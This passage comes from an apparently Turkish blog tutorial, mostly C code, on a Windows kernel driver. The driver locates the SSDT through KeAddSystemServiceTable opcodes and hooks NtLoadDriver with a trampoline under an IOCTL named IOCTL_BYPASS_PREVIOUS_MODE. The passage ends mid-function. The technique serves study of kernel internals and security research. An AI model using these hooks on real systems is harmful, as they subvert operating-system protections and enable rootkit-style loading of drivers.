+</span></span><span class="line"><span class="cl"> <span class="nf">IoDeleteSymbolicLink</span><span class="p">(</span><span class="o">&amp;</span><span class="n">SymName</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="nf">IoDeleteDevice</span><span class="p">(</span><span class="n">DriverObject</span><span class="o">-&gt;</span><span class="n">DeviceObject</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="nf">DbgPrintEx</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;Driver Unloaded!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">NTSTATUS</span> <span class="nf">DriverEntry</span><span class="p">(</span><span class="n">PDRIVER_OBJECT</span> <span class="n">DriverObject</span><span class="p">,</span> <span class="n">PUNICODE_STRING</span> <span class="n">RegistryPath</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"> <span class="nf">UNREFERENCED_PARAMETER</span><span class="p">(</span><span class="n">RegistryPath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="n">UNICODE_STRING</span> <span class="n">DeviceName</span> <span class="o">=</span> <span class="nf">RTL_CONSTANT_STRING</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;</span><span class="se">\\</span><span class="s">Device</span><span class="se">\\</span><span class="s">MyDriverr&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="n">UNICODE_STRING</span> <span class="n">SymName</span> <span class="o">=</span> <span class="nf">RTL_CONSTANT_STRING</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;</span><span class="se">\\</span><span class="s">??</span><span class="se">\\</span><span class="s">MyDriverr&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="n">PDEVICE_OBJECT</span> <span class="n">DeviceObject</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="n">NTSTATUS</span> <span class="n">Status</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">Status</span> <span class="o">=</span> <span class="nf">IoCreateDevice</span><span class="p">(</span><span class="n">DriverObject</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">DeviceName</span><span class="p">,</span> <span class="n">FILE_DEVICE_UNKNOWN</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">DeviceObject</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">NT_SUCCESS</span><span class="p">(</span><span class="n">Status</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">DbgPrintEx</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;Failed to Create I/O Device!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">Status</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">Status</span> <span class="o">=</span> <span class="nf">IoCreateSymbolicLink</span><span class="p">(</span><span class="o">&amp;</span><span class="n">SymName</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">DeviceName</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">NT_SUCCESS</span><span class="p">(</span><span class="n">Status</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">DbgPrintEx</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;Failed to Create Symbolic Link!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">Status</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">UNICODE_STRING</span> <span class="n">KeAddSystemString</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="n">PVOID</span> <span class="n">fKeAddSystemAddress</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="nf">RtlInitUnicodeString</span><span class="p">(</span><span class="o">&amp;</span><span class="n">KeAddSystemString</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;KeAddSystemServiceTable&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">fKeAddSystemAddress</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="nf">MmGetSystemRoutineAddress</span><span class="p">(</span><span class="o">&amp;</span><span class="n">KeAddSystemString</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="nf">DbgPrintEx</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;KeAddSystemServiceTable Address: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">fKeAddSystemAddress</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">PVOID</span> <span class="n">SSDTAddress</span> <span class="o">=</span> <span class="nf">GetSSDTAddress</span><span class="p">(</span><span class="n">fKeAddSystemAddress</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="nf">DbgPrintEx</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;SSDT Address: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">SSDTAddress</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">UINT32</span> <span class="n">Offset</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">PUINT32</span><span class="p">)((</span><span class="n">PUCHAR</span><span class="p">)</span><span class="n">SSDTAddress</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">SSN_NTLOADDRIVER</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="nf">DbgPrintEx</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;Offset: 0x%x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">Offset</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">g_NtLoadDriverAddress</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="n">PUCHAR</span><span class="p">)</span><span class="n">SSDTAddress</span> <span class="o">+</span> <span class="p">(</span><span class="n">Offset</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"> <span class="nf">DbgPrintEx</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;NtLoadDriver Address: 0x%p</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">g_NtLoadDriverAddress</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">DriverObject</span><span class="o">-&gt;</span><span class="n">MajorFunction</span><span class="p">[</span><span class="n">IRP_MJ_CREATE</span><span class="p">]</span> <span class="o">=</span> <span class="n">IoCreateClose</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="n">DriverObject</span><span class="o">-&gt;</span><span class="n">MajorFunction</span><span class="p">[</span><span class="n">IRP_MJ_CLOSE</span><span class="p">]</span> <span class="o">=</span> <span class="n">IoCreateClose</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="n">DriverObject</span><span class="o">-&gt;</span><span class="n">MajorFunction</span><span class="p">[</span><span class="n">IRP_MJ_DEVICE_CONTROL</span><span class="p">]</span> <span class="o">=</span> <span class="n">IoControl</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="n">DriverObject</span><span class="o">-&gt;</span><span class="n">DriverUnload</span> <span class="o">=</span> <span class="n">UnloadDriver</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="n">STATUS_SUCCESS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>Kodlarımız bu şekilde. Şimdi ise DriverEntry&rsquo;den başlayalım:</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">UNICODE_STRING</span> <span class="n">KeAddSystemString</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="n">PVOID</span> <span class="n">fKeAddSystemAddress</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="nf">RtlInitUnicodeString</span><span class="p">(</span><span class="o">&amp;</span><span class="n">KeAddSystemString</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;KeAddSystemServiceTable&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">fKeAddSystemAddress</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="nf">MmGetSystemRoutineAddress</span><span class="p">(</span><span class="o">&amp;</span><span class="n">KeAddSystemString</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="nf">DbgPrintEx</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;KeAddSystemServiceTable Address: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">fKeAddSystemAddress</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">PVOID</span> <span class="n">SSDTAddress</span> <span class="o">=</span> <span class="nf">GetSSDTAddress</span><span class="p">(</span><span class="n">fKeAddSystemAddress</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="nf">DbgPrintEx</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;SSDT Address: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">SSDTAddress</span><span class="p">);</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>Burada yaptığımız şey, SSDT&rsquo;nin adresini alan fonksiyona KeAddSystemServiceTable&rsquo;ın adresini vermektir. Uzaktan bakıldığında bunu garip karşılayabilirsiniz ancak bunun neden yapıldığını yakından bir görelim:</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">PVOID</span> <span class="nf">GetSSDTAddress</span><span class="p">(</span><span class="n">PVOID</span> <span class="n">KeAddSystemServiceAddr</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"> <span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">  ------------------
+</span></span></span><span class="line"><span class="cl"><span class="cm">  kd&gt; u nt!KeAddSystemServiceTable+0xbd L1
+</span></span></span><span class="line"><span class="cl"><span class="cm">  nt!KeAddSystemServiceTable+0xbd:
+</span></span></span><span class="line"><span class="cl"><span class="cm">  fffff800`aae7bdcd 48391d0c5b7800  cmp     qword ptr [nt!KeServiceDescriptorTable+0x20 (fffff800`ab6018e0)],rbx
+</span></span></span><span class="line"><span class="cl"><span class="cm">  ------------------
+</span></span></span><span class="line"><span class="cl"><span class="cm">  
+</span></span></span><span class="line"><span class="cl"><span class="cm">  We will dynamically obtain the address of the SSDT by reading the opcodes at this address by the KeAddSystemServiceTable address.
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
+</span></span><span class="line"><span class="cl"> <span class="n">PVOID</span> <span class="n">AddressToRead</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="n">PVOID</span> <span class="n">NewAddress</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="n">PBYTE</span> <span class="n">Instruction</span> <span class="o">=</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">KeAddSystemServiceAddr</span> <span class="o">+</span> <span class="mh">0xbd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="cm">/* Get Offset Address */</span>
+</span></span><span class="line"><span class="cl"> <span class="n">DWORD</span> <span class="n">OffsetAddress</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">PDWORD</span><span class="p">)(</span><span class="n">Instruction</span> <span class="o">+</span> <span class="mi">3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="cm">/* Calculate RIP */</span>
+</span></span><span class="line"><span class="cl"> <span class="n">UINT_PTR</span> <span class="n">rip</span> <span class="o">=</span> <span class="p">(</span><span class="n">UINT_PTR</span><span class="p">)</span><span class="n">Instruction</span> <span class="o">+</span> <span class="mi">7</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="cm">/* Add Offset Address to RIP */</span>
+</span></span><span class="line"><span class="cl"> <span class="n">AddressToRead</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)(</span><span class="n">rip</span> <span class="o">+</span> <span class="p">(</span><span class="n">INT32</span><span class="p">)</span><span class="n">OffsetAddress</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="cm">/* Get Absolute Address */</span>
+</span></span><span class="line"><span class="cl"> <span class="n">AddressToRead</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">AddressToRead</span> <span class="o">-</span> <span class="mh">0x20</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">NewAddress</span> <span class="o">=</span> <span class="nf">GetAddress</span><span class="p">(</span><span class="n">AddressToRead</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="n">NewAddress</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>(Windows 11 24H2 için) KeAddSystemServiceTable fonksiyonu içerisinde hedef aldığımız bir instruction&rsquo;u kullanarak bu instruction&rsquo;a ait opcode&rsquo;u okuyarak SSDT&rsquo;nin adresini elde ediyoruz.</p>
+<p>Hedef aldığımız kısımda SSDT&rsquo;nin+0x20 adresi ile rbx&rsquo;nin değeri kontrol edildiğini göreceksiniz. Açıkçası bunu gördükten sonra madem kontrol için SSDT&rsquo;nin adresi kullanılıyor bende opcode&rsquo;ları okuyarak adresini elde etmeye karar verdim :D. Basit olduğunun farkındayım ancak şuanda işlevli. Eğer bu konuya yakından araştırmak isterseniz <a href="https://medium.com/@0xbekoo/finding-ssdt-address-with-driver-c8b6bb60d722" target="_blank" rel="noopener">Medium makaleme</a> göz atabilirsiniz.</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">UINT32</span> <span class="n">Offset</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">PUINT32</span><span class="p">)((</span><span class="n">PUCHAR</span><span class="p">)</span><span class="n">SSDTAddress</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">SSN_NTLOADDRIVER</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="nf">DbgPrintEx</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;Offset: 0x%x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">Offset</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">g_NtLoadDriverAddress</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="n">PUCHAR</span><span class="p">)</span><span class="n">SSDTAddress</span> <span class="o">+</span> <span class="p">(</span><span class="n">Offset</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"> <span class="nf">DbgPrintEx</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;NtLoadDriver Address: 0x%p</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">g_NtLoadDriverAddress</span><span class="p">);</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>SSDT&rsquo;nin adresini aldıktan sonra ise bilinen formüller aracılığıyla NtLoadDriver&rsquo;ın adresini hesaplıyoruz.</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">NTSTATUS</span> <span class="nf">IoControl</span><span class="p">(</span><span class="n">PDEVICE_OBJECT</span> <span class="n">DeviceObject</span><span class="p">,</span> <span class="n">PIRP</span> <span class="n">Irp</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"> <span class="nf">UNREFERENCED_PARAMETER</span><span class="p">(</span><span class="n">DeviceObject</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">PIO_STACK_LOCATION</span> <span class="n">Stack</span> <span class="o">=</span> <span class="nf">IoGetCurrentIrpStackLocation</span><span class="p">(</span><span class="n">Irp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="n">BOOLEAN</span> <span class="n">Value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="k">switch</span> <span class="p">(</span><span class="n">Stack</span><span class="o">-&gt;</span><span class="n">Parameters</span><span class="p">.</span><span class="n">DeviceIoControl</span><span class="p">.</span><span class="n">IoControlCode</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="k">case</span> <span class="nl">IOCTL_BYPASS_PREVIOUS_MODE</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Value</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">PBOOLEAN</span><span class="p">)</span><span class="n">Irp</span><span class="o">-&gt;</span><span class="n">AssociatedIrp</span><span class="p">.</span><span class="n">SystemBuffer</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">Value</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">   <span class="n">Irp</span><span class="o">-&gt;</span><span class="n">IoStatus</span><span class="p">.</span><span class="n">Status</span> <span class="o">=</span> <span class="n">STATUS_INVALID_DEVICE_REQUEST</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">   <span class="n">Irp</span><span class="o">-&gt;</span><span class="n">IoStatus</span><span class="p">.</span><span class="n">Information</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">   <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">DbgPrintEx</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;IOCTL code received (IOCTL_BYPASS_PREVIOUS_MODE)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nf">HkDetourFunction</span><span class="p">((</span><span class="n">PVOID</span><span class="p">)</span><span class="n">g_NtLoadDriverAddress</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="n">HookedNtLoadDriver</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">OriginalNtLoadDriver</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">Irp</span><span class="o">-&gt;</span><span class="n">IoStatus</span><span class="p">.</span><span class="n">Status</span> <span class="o">=</span> <span class="n">STATUS_SUCCESS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Irp</span><span class="o">-&gt;</span><span class="n">IoStatus</span><span class="p">.</span><span class="n">Information</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="k">default</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Irp</span><span class="o">-&gt;</span><span class="n">IoStatus</span><span class="p">.</span><span class="n">Status</span> <span class="o">=</span> <span class="n">STATUS_INVALID_DEVICE_REQUEST</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Irp</span><span class="o">-&gt;</span><span class="n">IoStatus</span><span class="p">.</span><span class="n">Information</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> <span class="nf">IoCompleteRequest</span><span class="p">(</span><span class="n">Irp</span><span class="p">,</span> <span class="n">IO_NO_INCREMENT</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="n">Irp</span><span class="o">-&gt;</span><span class="n">IoStatus</span><span class="p">.</span><span class="n">Status</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>Daha sonra IoControl fonksiyonu altında User-Mode programın göndereceği <strong>IOCTL_BYPASS_PREVIOUS_MODE</strong> kodunu işliyoruz. Burada gözünüze <strong>HkDetourFunction</strong> çarpması lazım çünkü NtLoadDriver&rsquo;ın adresine trambolini yerleştiren fonksiyon bu.</p>
+<p>Fakat bu HkDetourFunction kodları bana ait değil. Özellikle son zamanlarda bu trambolini yerleştirmek için baya uğraşsam da gerçekten BSOD almaktan delirdim ve hazır almaya karar verdim. Orijinal github repo için <a href="https://github.com/adrianyy/kernelhook" target="_blank" rel="noopener">buraya</a> tıklayabilirsiniz.</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">NTSTATUS</span> <span class="nf">HookedNtLoadDriver</span><span class="p">(</span><span class="n">PUNICODE_STRING</span> <span class="n">DriverServiceName</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"> <span class="n">UNICODE_STRING</span> <span class="n">UserBuffer</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="n">BOOLEAN</span> <span class="n">PreviousStatus</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="nf">HkRestoreFunction</span><span class="p">((</span><span class="n">PVOID</span><span class="p">)</span><span class="n">g_NtLoadDriverAddress</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="n">OriginalNtLoadDriver</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">UserBuffer</span><span class="p">.</span><span class="n">Buffer</span> <span class="o">=</span> <span class="nf">ExAllocatePoolWithTag</span><span class="p">(</span><span class="n">NonPagedPool</span><span class="p">,</span> <span class="n">DriverServiceName</span><span class="o">-&gt;</span><span class="n">Length</span><span class="p">,</span> <span class="err">&#39;</span><span class="n">buff</span><span class="err">&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="n">UserBuffer</span><span class="p">.</span><span class="n">Buffer</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">STATUS_INSUFFICIENT_RESOURCES</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>
